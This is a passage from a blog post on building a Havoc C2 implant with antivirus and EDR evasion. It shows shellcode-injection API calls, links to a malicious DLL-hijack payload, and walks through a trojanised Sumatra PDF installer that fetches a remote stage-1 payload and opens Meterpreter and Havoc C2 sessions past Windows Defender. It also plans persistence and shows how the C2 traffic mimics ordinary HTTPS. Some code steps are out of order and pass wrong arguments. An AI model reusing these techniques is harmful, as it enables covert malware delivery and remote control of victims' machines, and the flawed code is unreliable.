6\. Use VirtualProtectEx (again) to set the permissions back to PAGE\_EXECUTE\_READWRITE after AV did it’s thing and thinks it’s safe.

> VirtualProtectEx(processHandle, remoteBuffer, sizeof recvbuf, PROCESS\_ALL\_ACCESS, NULL);

7\. Finally, call ResumeThread to start our thread.

> ResumeThread(remoteThread);

8\. Use WriteProcessMemory to run our shellcode in memory.

> WriteProcessMemory(processHandle, remoteBuffer, recvbuf, sizeof recvbuf, NULL);

Here's the final payload file dllmain.cpp on my Github:

[**DLLHijack/dllmain.cpp at main · srothlisberger6361/DLLHijack** \\
\\
**Contribute to srothlisberger6361/DLLHijack development by creating an account on GitHub.**\\
\\
github.com](https://github.com/srothlisberger6361/DLLHijack/blob/main/dllmain.cpp?source=post_page-----733d423fc67b---------------------------------------)

### Test AV/EDR Bypass (again)

If this Meterpreter shellcode works, then our Havoc C2 connection definitely should since we implemented newer bypass and obscuration techniques for that. I double click on our Sumatra PDF installer executable.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*BWunmuxRDBAJsjrAimFyOg.png)

Windows Defender On and Updated

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*aIIMMpPHZBD-QmLFSXScBA.png)

Sumatra PDF Installer Running like Normal

The DLL grabs my stage 1 payload from my HTTP server and executes it over HTTPS to my meterpreter multi/listener.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*P2BjjzSCwKx3R80xSWG-QQ.png)

The HTTPS connection is established over meterpreter and the stage 2 payload is downloaded and executed on the victim.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*JDupBORwa0hY1Fek5ZA7Bg.png)

I finally receive an encrypted C2 session on Havoc C2 client.

![](https://miro.medium.com/v2/resize:fit:591/1*81yHDrC9joTGtsN9i3uBcg.png)

This is great so far! In my next post we’re going to cover packaging this executable and DLL to look less ominous, using it to achieve persistence in a scheduled task, and also exploiting over the internet instead of a local network. I hope you enjoyed the read!

### **BONUS: Wireshark Analysis**

I was interested in what these connections looked like on Wireshark. For the pcap data below, the attacker IP is 10.0.2.9 and the victim IP is 10.0.2.15.

1. Stage 2 payload (meterpreter) download:

After the stage 1 payload shellcode is loaded into memory, its executed by the victim to download the stage 2 payload. After the initial TCP handshake (10–14), the victim says here’s all my options for creating a secure session (18). The server then says here’s my certificate and my session options too (20). The victim then comes back and says I want to use these options. The server creates a new session ticket (23) and the victim acknowledges it (24). Then starting on packet (34) the stage 2 payload is sent to the victim using the encrypted session ticket. In packet 44, the whole stage 2 payload is sent to the victim. Overall, this looks pretty normal on the network side.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*VLSV2HwiZXdpvjzWOZhM8A.png)

2\. Stage 2 payload (Havoc C2) execution:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*Fjd771tjVcqlxFI0aXk0yg.png)

Above it looks like our Havoc C2 generated SSL cert for the client is for some company in Arizona. Below, sending the command “whoami” in Havoc C2 generates a payload size of about 4kb which is not bad at all.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*jlPOY6KoyUUzN05bCT9biQ.png)

The victim continues to ping the attacker very frequently and the attacker client replies with an ACK. Lets see how this looks against a real HTTPS website connection [https://facebook.com](https://facebook.com/) (68.105.28.11) below.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*hTGtHM_uaM0mUcxuM5O5fA.png)

So the server and client act in the same way by pinging each other alot. The victim (client) continues to send application data to the server (attacker) and the server (attacker) responds with an ACK. The packet lengths seem about the same too, so I think Havoc C2 would do good against most EDR and IDS/IPS rulesets.

[Cybersecurity](https://medium.com/tag/cybersecurity?source=post_page-----733d423fc67b---------------------------------------)

[Malware](https://medium.com/tag/malware?source=post_page-----733d423fc67b---------------------------------------)

[Hacking](https://medium.com/tag/hacking?source=post_page-----733d423fc67b---------------------------------------)

[C Programming](https://medium.com/tag/c-programming?source=post_page-----733d423fc67b---------------------------------------)

[![Sam Rothlisberger](https://miro.medium.com/v2/resize:fill:48:48/1*Fzh2QBHCL67uIEt-y9at1w.jpeg)](https://medium.com/@sam.rothlisberger?source=post_page---post_author_info--733d423fc67b---------------------------------------)

[![Sam Rothlisberger](https://miro.medium.com/v2/resize:fill:64:64/1*Fzh2QBHCL67uIEt-y9at1w.jpeg)](https://medium.com/@sam.rothlisberger?source=post_page---post_author_info--733d423fc67b---------------------------------------)

Follow

[**Written by Sam Rothlisberger**](https://medium.com/@sam.rothlisberger?source=post_page---post_author_info--733d423fc67b---------------------------------------)

[1K followers](https://medium.com/@sam.rothlisberger/followers?source=post_page---post_author_info--733d423fc67b---------------------------------------)

· [5 following](https://medium.com/@sam.rothlisberger/following?source=post_page---post_author_info--733d423fc67b---------------------------------------)

CompTIA Security+ Practice Questions : [https://www.udemy.com/course/comptia-security-plus-sy0-701-practice-tests/?referralCode=56015800FAABB6F91CFE](https://www.udemy.com/course/comptia-security-plus-sy0-701-practice-tests/?referralCode=56015800FAABB6F91CFE)

Follow

## Responses (9)

![](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

Write a response

[What are your thoughts?](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fhavoc-c2-with-av-edr-bypass-methods-in-2024-part-1-733d423fc67b&source=---post_responses--733d423fc67b---------------------respond_sidebar------------------)

Cancel

Respond

[![Tylerforbes](https://miro.medium.com/v2/resize:fill:32:32/0*F8lT47kyljMZBBSt)](https://medium.com/@tylerforbes9799?source=post_page---post_responses--733d423fc67b----0-----------------------------------)

[Tylerforbes](https://medium.com/@tylerforbes9799?source=post_page---post_responses--733d423fc67b----0-----------------------------------)

[Feb 2, 2024](https://medium.com/@tylerforbes9799/awesome-post-739266d0922d?source=post_page---post_responses--733d423fc67b----0-----------------------------------)

```
Awesome post
```

--

Reply

[![Trevor Kutto Hacks](https://miro.medium.com/v2/resize:fill:32:32/1*IwGMOFu8uaLFGcePizBkNg.jpeg)](https://medium.com/@tkutto?source=post_page---post_responses--733d423fc67b----1-----------------------------------)

[Trevor Kutto Hacks](https://medium.com/@tkutto?source=post_page---post_responses--733d423fc67b----1-----------------------------------)

[Feb 7, 2024](https://medium.com/@tkutto/need-more-baa49939322a?source=post_page---post_responses--733d423fc67b----1-----------------------------------)

```
need more
```

--

Reply

[![Lyxt](https://miro.medium.com/v2/resize:fill:32:32/1*pBaUW3iwBr4bowIdsdwsHQ.png)](https://medium.com/@puteh?source=post_page---post_responses--733d423fc67b----2-----------------------------------)

[Lyxt](https://medium.com/@puteh?source=post_page---post_responses--733d423fc67b----2-----------------------------------)

[Feb 28, 2025](https://puteh.medium.com/im-working-on-python-modules-to-do-hollow-process-instead-of-obfuscating-for-now-notepad-exe-44930390ad9c?source=post_page---post_responses--733d423fc67b----2-----------------------------------)

```
Im working on python modules to do Hollow Process instead of obfuscating, for now, Notepad.exe is doing well with allocating the original demon binary, but, in some cases, my method required for DEP and other security option to be off ..

Just want…more
```

--

Reply

See all responses

## More from Sam Rothlisberger

[See all from Sam Rothlisberger](https://medium.com/@sam.rothlisberger?source=post_page---author_recirc--733d423fc67b---------------------------------------)

## Recommended from Medium

[See more recommendations](https://medium.com/?source=post_page---read_next_recirc--733d423fc67b---------------------------------------)

[Help](https://help.medium.com/hc/en-us?source=post_page-----733d423fc67b---------------------------------------)

[Status](https://status.medium.com/?source=post_page-----733d423fc67b---------------------------------------)

[About](https://medium.com/about?autoplay=1&source=post_page-----733d423fc67b---------------------------------------)

[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----733d423fc67b---------------------------------------)

[Press](mailto:pressinquiries@medium.com)

[Blog](https://blog.medium.com/?source=post_page-----733d423fc67b---------------------------------------)

[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----733d423fc67b---------------------------------------)

[Rules](https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----733d423fc67b---------------------------------------)

[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----733d423fc67b---------------------------------------)

[Text to speech](https://speechify.com/medium?source=post_page-----733d423fc67b---------------------------------------)

reCAPTCHA

Recaptcha requires verification.

[Privacy](https://www.google.com/intl/en/policies/privacy/) \- [Terms](https://www.google.com/intl/en/policies/terms/)

protected by **reCAPTCHA**

[Privacy](https://www.google.com/intl/en/policies/privacy/) \- [Terms](https://www.google.com/intl/en/policies/terms/)